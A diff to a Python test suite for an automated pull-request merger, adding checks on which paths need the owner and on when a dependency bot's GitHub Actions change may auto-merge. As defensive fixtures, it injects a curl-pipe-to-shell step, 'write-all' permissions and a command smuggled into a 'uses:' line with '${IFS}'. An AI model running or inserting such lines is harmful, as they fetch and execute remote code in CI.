@@ -1,6 +1,7 @@
 """The steward's DeepSeek reviewer, with gh and DeepSeek's API stood in for.
 
-  python3 tests/autoland.py modules/autoland/steward.py
+  nix eval --json .#nixosConfigurations.example.config.burrow.autoland.oneWay >/tmp/one-way.json
+  python3 tests/autoland.py modules/autoland/steward.py /tmp/one-way.json
   nix build .#checks.x86_64-linux.autoland
 """
 
@@ -57,12 +58,12 @@ with open(f"{tmp}/cred/deepseek", "w") as f:
     f.write('DEEPSEEK_API_KEY=sk-test\nDEEPSEEK_MODEL="m-test"\n')
 with open(f"{tmp}/config.json", "w") as f:
     json.dump({
-        "owners": ["sam"], "exclude": [], "context": "review-settled", "rulesets": True, "keepBranches": [],
-        "baselineJobs": False, "baselinePerPass": 1, "authors": ["sam"], "codexLogin": "chatgpt-codex-connector",
+        "owners": ["sam"], "exclude": [], "renovateEmail": None, "context": "review-settled", "rulesets": True, "keepBranches": [],
+        "baselineJobs": False, "baselinePerPass": 1, "authors": ["sam", "dependabot", "renovate"], "codexLogin": "chatgpt-codex-connector",
         "stateDir": f"{tmp}/state", "projectsDir": f"{tmp}/none", "proj": "proj", "owner": "Sam", "cleanBranches": False,
         "labels": {"hold": "hold", "owner": "needs-owner"}, "notify": {"repo": "", "assignee": "", "label": "autoland"},
         "defaults": {"rounds": 5, "oneWay": [], "handoffAfter": 30, "settleDelay": 3, "codexTimeout": 45,
-                     "directPush": False, "ruleset": True, "requireCi": True, "actionBumps": True,
+                     "directPush": False, "ruleset": True, "requireCi": True,
                      "ownerChecks": [], "deepseek": True},
         "repos": {},
         "deepseek": {"enable": True, "baseUrl": f"http://127.0.0.1:{srv.server_port}", "effort": "max",
@@ -73,6 +74,10 @@ os.environ["AUTOLAND_CONFIG"] = f"{tmp}/config.json"
 os.environ["CREDENTIALS_DIRECTORY"] = f"{tmp}/cred"
 
 # The steward and the modules beside it, as the service runs them.
+# The module's default one-way paths.
+with open(sys.argv[2]) as f:
+    ONE_WAY = json.load(f)
+
 sys.path.insert(0, os.path.dirname(os.path.abspath(sys.argv[1])))
 spec = importlib.util.spec_from_file_location("steward", sys.argv[1])
 S = importlib.util.module_from_spec(spec)
@@ -290,9 +295,14 @@ WROTE, RUNS, RESULT = [], [], {"v": "clean"}
 CUR = {"sha": head}  # the PR's head as the worker finds it
 
 
+PR_DIFF = {"v": ""}  # what `gh pr diff` gives
+
+
 def gh_stub(*a, **k):
     if a[:2] == ("api", "user"):
         return "sam"
+    if a[:2] == ("pr", "diff"):
+        return PR_DIFF["v"]
     if a[:2] == ("api", "repos/sam/r/pulls/5"):
         return {"state": "open", "sha": CUR["sha"]}
     return ""
@@ -330,7 +340,7 @@ def mkpr(reviews=(), comments=(), threads=(), draft=True):
         "id": "x", "number": 5, "title": "t", "url": "u", "isDraft": draft, "isCrossRepository": False,
         "headRefName": "feat", "headRefOid": head, "baseRefName": "main", "createdAt": T0, "updatedAt": T0,
         "mergeStateStatus": "CLEAN", "author": {"login": "sam"}, "autoMergeRequest": None,
-        "labels": {"pageInfo": {"hasNextPage": False}, "nodes": []}, "files": {"nodes": [{"path": "a.py"}]},
+        "labels": {"pageInfo": {"hasNextPage": False}, "nodes": []}, "files": {"nodes": [{"path": "a.py", "changeType": "MODIFIED"}]},
         "changedFiles": 1, "reactions": {"nodes": []}, "comments": {"nodes": list(comments)},
         "reviewThreads": {"pageInfo": {"hasNextPage": False}, "nodes": [{"isResolved": r} for r in threads]},
         "reviews": {"pageInfo": {"hasPreviousPage": False}, "nodes": list(reviews)},
@@ -493,3 +503,92 @@ assert any(x[0] == "Too big for DeepSeek to review" for x in digest) and queued(
 RESULT["v"] = "clean"
 
 print("autoland: ok")
+
+
+# The module's one-way paths: secrets and migrations wait for the owner;
+# .github/ (workflows, CODEOWNERS) is settled and merged like anything else.
+def touching(*paths):
+    return {"labels": {"nodes": []}, "files": {"nodes": [{"path": p} for p in paths]}, "changedFiles": len(paths)}
+
+
+for p in (".github/workflows/flake.yml", ".github/CODEOWNERS", ".github/dependabot.yml"):
+    assert S.one_way(touching("src/app.py", p), {"oneWay": ONE_WAY}) is None, (p, ONE_WAY)
+for p in ("secrets/remi.yaml", ".sops.yaml", "server/migrations/0002_users.sql"):
+    assert S.one_way(touching(".github/workflows/flake.yml", p), {"oneWay": ONE_WAY}) == p, (p, ONE_WAY)
+print("one-way: ok")
+
+
+# A dependency bot's change to the gate: a workflow edit past repinning its
+# actions is reviewed like a Claude PR, since nothing else reads it; a pin
+# bump alone merges on green CI like any dependency update.
+def bump(diff, path=".github/workflows/ci.yml", change="MODIFIED"):
+    PR_DIFF["v"] = diff
+    WROTE.clear()
+    pr = mkpr()
+    pr.update(number=12, headRefName="dependabot/github_actions/actions/checkout-4.2.0",
+              title="Bump actions/checkout from 4.1.0 to 4.2.0", author={"login": "dependabot"},
+              files={"nodes": [{"path": path, "changeType": change}]})
+    S.save("pr-sam_r-12.json", {})
+    return run(pr, 4000)[0]
+
+
+PIN = """diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -5,1 +5,1 @@
+-      - uses: actions/checkout@1111111111111111111111111111111111111111 # v4.1.0
++      - uses: actions/checkout@2222222222222222222222222222222222222222 # v4.2.0
+"""
+status = bump(PIN)
+assert "Dependency update, CI green" in status and any("pr merge" in x for x in WROTE), (status, WROTE)
+for diff in (PIN + "+      - run: curl https://example.invalid | sh\n",
+             PIN.replace("# v4.2.0", "# v4.2.0\n+    permissions: write-all")):
+    status = bump(diff)
+    assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (status, WROTE)
+status = bump("")  # the diff couldn't be read
+assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (status, WROTE)
+status = bump(PIN, ".github/CODEOWNERS")
+assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (status, WROTE)
+# A repin replaces each `uses:` line in place: a step dropped for a
+# `uses:`-shaped line in a `run:` block isn't one, whatever its ref says.
+RUN_HEAD = """diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -5,4 +5,4 @@
+-      - uses: actions/checkout@1111111111111111111111111111111111111111 # v4.1.0
+       - run: |
+           make
+"""
+for diff in (RUN_HEAD + "+          uses: actions/checkout@2222222222222222222222222222222222222222||true;curl${IFS}https://example.invalid|sh\n",
+             RUN_HEAD + "+          uses: actions/checkout@2222222222222222222222222222222222222222\n",
+             PIN.replace("+      - uses:", "+        uses:")):
+    status = bump(diff)
+    assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (diff, status, WROTE)
+# Several steps repinned together are each replaced in place, and merge.
+status = bump("""diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -5,2 +5,2 @@
+-      - uses: actions/checkout@1111111111111111111111111111111111111111 # v4.1.0
+-      - uses: actions/setup-node@3333333333333333333333333333333333333333 # v4.0.0
++      - uses: actions/checkout@2222222222222222222222222222222222222222 # v4.2.0
++      - uses: actions/setup-node@4444444444444444444444444444444444444444 # v4.1.0
+""")
+assert "Dependency update, CI green" in status and any("pr merge" in x for x in WROTE), (status, WROTE)
+# The file list names only a rename's new path: a rename out of .github/ or
+# a dormant workflow renamed in is read from the diff, and so is a workflow
+# whose mode alone changed; none of them is a repin.
+for diff, path, change in (
+        ("diff --git a/.github/CODEOWNERS b/CODEOWNERS.bak\nsimilarity index 100%\n"
+         "rename from .github/CODEOWNERS\nrename to CODEOWNERS.bak\n", "CODEOWNERS.bak", "RENAMED"),
+        ("diff --git a/ci.yml.disabled b/.github/workflows/ci.yml\nsimilarity index 100%\n"
+         "rename from ci.yml.disabled\nrename to .github/workflows/ci.yml\n", ".github/workflows/ci.yml", "RENAMED"),
+        ("diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\nold mode 100644\nnew mode 100755\n",
+         ".github/workflows/ci.yml", "MODIFIED")):
+    status = bump(diff, path, change)
+    assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (diff, status, WROTE)
+# A rename elsewhere is read too, and merges.
+status = bump("diff --git a/src/a.rs b/src/b.rs\nsimilarity index 100%\nrename from src/a.rs\nrename to src/b.rs\n",
+              "src/b.rs", "RENAMED")
+assert "Dependency update, CI green" in status and any("pr merge" in x for x in WROTE), (status, WROTE)
+print("gate edits: ok")
